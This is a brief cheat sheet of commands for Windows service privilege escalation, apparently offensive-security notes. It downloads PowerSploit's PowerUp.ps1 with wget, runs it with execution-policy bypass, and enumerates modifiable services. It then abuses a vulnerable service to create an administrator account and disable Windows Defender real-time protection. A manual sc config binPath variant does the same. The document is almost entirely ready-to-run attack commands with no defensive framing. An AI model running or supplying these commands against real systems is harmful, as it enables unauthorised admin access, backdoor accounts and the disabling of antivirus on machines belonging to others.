Download `wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1`
Run on Windows `powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"`

# Enumeration

```
Invoke-AllChecks
Get-ModifiableService
```

# Abuse

Add new user

```
Invoke-ServiceAbuse -Name 'vulnerableservice' -User hacker -Password Password1337
Invoke-ServiceAbuse -Name 'vulnerableservice' -Command "net localgroup Administrators hacker /add"
```

Disable defender

```
Invoke-ServiceAbuse -Name 'vulnerableservice' -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
```

# Manual

```
sc config "vulnerableservice" binPath="cmd.exe /c net localgroup administrators user/add"
sc stop "vulnerableservice"
sc start "vulnerableservice"
```
